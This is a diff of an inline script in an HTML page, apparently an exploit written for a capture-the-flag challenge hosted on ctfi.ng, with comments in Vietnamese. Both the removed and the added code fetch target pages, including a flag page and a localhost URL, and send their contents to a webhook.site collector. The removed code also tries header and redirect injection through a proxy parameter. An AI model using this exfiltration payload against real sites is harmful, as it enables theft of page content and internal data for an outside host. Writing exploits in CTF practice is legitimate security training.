@@ -5,60 +5,34 @@
 </head>
 <body>
 <script>
-
-fetch('https://7332d1d2-cd75-48ac-a396-869e505e7dca.webhook.site/ping');
-
-// payload chính
-const headers = [
-"Access-Control-Allow-Origin:*",
-"Access-Control-Allow-Credentials:true",
-"Access-Control-Expose-Headers:*",
-"Content-Type:text/plain",
-"Content-Type:application/json",
-"Location:https://7332d1d2-cd75-48ac-a396-869e505e7dca.webhook.site/test",
-"Refresh:0;url=https://7332d1d2-cd75-48ac-a396-869e505e7dca.webhook.site/test"
-];
-
-for (const h of headers) {
-
- fetch("https://mirror-temple-b-side-5e7012f5633b.ctfi.ng/proxy?url=https://mirror-temple-b-side-5e7012f5633b.ctfi.ng/flag&mirror=" + encodeURIComponent(h))
- .then(r=>r.text())
- .then(t=>{
-   fetch("https://mirror-temple-b-side-5e7012f5633b.ctfi.ng/proxy?url=" + encodeURIComponent(
-     "https://7332d1d2-cd75-48ac-a396-869e505e7dca.webhook.site/?hdr="+encodeURIComponent(h)+"&len="+t.length
-   ));
- });
-
-}
+const target = "https://mirror-temple-b-side-5e7012f5633b.ctfi.ng/postcard-from-nyc";
+const target2 = "https://localhost:8080/postcard-from-nyc";
 const webhook = "https://7332d1d2-cd75-48ac-a396-869e505e7dca.webhook.site";
 
-// 1️⃣ fetch trang postcard
-fetch("https://mirror-temple-b-side-5e7012f5633b.ctfi.ng/proxy?url=https://mirror-temple-b-side-5e7012f5633b.ctfi.ng/postcard-from-nyc&mirror=Access-Control-Allow-Origin:*")
-.then(r => r.text())
-.then(html => {
+fetch(target)
+  .then(r => r.text())
+  .then(html => {
+    // gửi chiều dài để debug
+    fetch(webhook + "/len?l=" + html.length);
 
-  // 2️⃣ gửi HTML qua webhook
-  const u = encodeURIComponent(webhook + "/html?len=" + html.length);
-  fetch("https://mirror-temple-b-side-5e7012f5633b.ctfi.ng/proxy?url=" + u);
+    // gửi nội dung (encode để không vỡ query)
+    fetch(webhook + "/html?data=" + encodeURIComponent(html));
+  })
+  .catch(e => {
+    fetch(webhook + "/err?e=" + encodeURIComponent(e.toString()));
+  });
+fetch(target2)
+  .then(r => r.text())
+  .then(html => {
+    // gửi chiều dài để debug
+    fetch(webhook + "/len?l=" + html.length);
 
-  // nếu muốn gửi cả content
-  const u2 = encodeURIComponent(webhook + "/html?data=" + encodeURIComponent(html.slice(0,200)));
-  fetch("https://mirror-temple-b-side-5e7012f5633b.ctfi.ng/proxy?url=" + u2);
-
-});
-fetch("https://mirror-temple-b-side-5e7012f5633b.ctfi.ng/postcard-from-nyc")
-.then(r => r.text())
-.then(html => {
-
-  // 2️⃣ gửi HTML qua webhook
-  const u3 = encodeURIComponent(webhook + "/html?len=" + html.length);
-  fetch("https://mirror-temple-b-side-5e7012f5633b.ctfi.ng/proxy?url=" + u3);
-
-  // nếu muốn gửi cả content
-  const u4 = encodeURIComponent(webhook + "/html?data=" + encodeURIComponent(html.slice(0,200)));
-  fetch("https://mirror-temple-b-side-5e7012f5633b.ctfi.ng/proxy?url=" + u4);
-
-});
+    // gửi nội dung (encode để không vỡ query)
+    fetch(webhook + "/html?data=" + encodeURIComponent(html));
+  })
+  .catch(e => {
+    fetch(webhook + "/err?e=" + encodeURIComponent(e.toString()));
+  });
 </script>
 </body>
 </html>
